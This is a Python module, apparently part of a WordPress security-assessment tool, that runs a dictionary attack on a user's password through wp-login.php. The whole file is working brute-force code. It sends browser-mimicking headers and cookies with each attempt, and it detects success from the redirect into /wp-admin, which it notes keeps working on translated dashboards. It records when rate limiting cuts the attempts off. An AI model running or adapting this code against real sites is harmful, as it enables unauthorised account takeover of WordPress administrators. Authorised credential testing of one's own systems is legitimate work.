"""Weak-credential testing against wp-login.php.

Success is detected from the redirect chain, not from page text: a valid
login lands on /wp-admin/..., a failed one bounces back to wp-login.php.
That keeps the check working on translated dashboards (the old
'Log Out' string match failed on any non-English site).
"""

from .. import httpclient


def dictionary_attack(report, target, user, passwords):
    """POST dictionary against wp-login.php. Returns the working password or None."""
    print(f"[*] Testing {len(passwords)} passwords for user '{user}' via wp-login.php")
    for index, password in enumerate(passwords, 1):
        resp = httpclient.post(
            f"{target}wp-login.php",
            data={
                "log": user,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": f"{target}wp-admin/",
                "testcookie": "1",
            },
            # exactly what a browser submits on the login form
            headers={
                "Cookie": "wordpress_test_cookie=WP%20Cookie%20check",
                "Origin": target.rstrip("/"),
                "Referer": f"{target}wp-login.php",
                "Sec-Fetch-Site": "same-origin",
            },
        )
        if resp is None:
            report.paragraph(f"wp-login.php became unreachable after {index - 1} attempts "
                             "(rate limiting?); credential testing aborted.")
            return None
        if _login_succeeded(resp):
            return password
    return None


def _login_succeeded(resp):
    final_url = resp.url.lower()
    # A failed login re-renders wp-login.php (200, no redirect followed); a valid
    # one follows redirect_to into /wp-admin. Never match on body text - the login
    # form itself mentions wp-admin in its hidden redirect_to field.
    if "wp-login.php" in final_url:
        return False
    return bool(resp.history) or "wp-admin" in final_url
